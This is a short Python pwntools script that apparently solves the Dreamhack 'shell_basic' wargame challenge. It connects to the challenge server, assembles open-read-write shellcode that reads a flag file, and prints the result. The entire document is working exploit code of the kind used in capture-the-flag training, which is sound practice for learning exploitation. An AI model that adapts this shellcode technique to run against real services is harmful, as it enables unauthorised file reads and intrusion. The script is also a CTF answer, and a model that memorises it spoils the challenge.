from pwn import *
p = remote('host2.dreamhack.games',  9492)
context.arch = 'amd64'
r = "/home/shell_basic/flag_name_is_loooooong"
shellcode = ''
shellcode += shellcraft.open(r)
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

p.recvuntil("shellcode: ")
p.sendline(asm(shellcode))
print(p.recv())
